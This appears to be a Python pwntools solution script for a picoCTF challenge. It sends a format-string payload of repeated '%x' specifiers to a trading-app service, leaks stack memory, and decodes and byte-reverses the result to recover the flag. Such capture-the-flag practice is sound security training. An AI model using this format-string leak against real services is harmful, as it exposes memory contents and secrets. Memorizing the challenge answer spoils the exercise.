from pwn import *
import codecs

server = remote('mercury.picoctf.net', 33411)

# Welcome back to the trading app!
#
# What would you like to do?
# 1) Buy some stonks!
# 2) View my portfolio
#
print(server.readuntil('portfolio\n'))

server.send(b'1\n')

# Using patented AI algorithms to buy stonks
# Stonks chosen
# What is your API token?
#
print(server.readuntil('token?\n'))

payload = bytes("%x-" * 100, 'ascii')
server.send(payload + b"\n")

# Buying stonks with token:
#
print(server.readuntil('\n'))

# ( leak data ... )
#
response_data = server.readuntil('\n')
print(b"response data: " + response_data)

# utf-8
sss = codecs.decode(response_data, 'utf-8')
data = sss.split('-')
res = ''
for x in data:
	try:
		x = bytearray.fromhex(x).decode()
		res += x
	except:
		continue
print("decoded data: " + res)

# reverse
res2 = ''
i = 0
while i < len(res) - 3:
	res2 += res[i + 3] + res[i + 2] + res[i + 1] + res[i]
	i += 4
print("After reverse: " + res2 + "}") # add "}" ?

# (data ...)
# Goodbye!
#
server.readuntil("Goodbye!\n")

server.interactive()


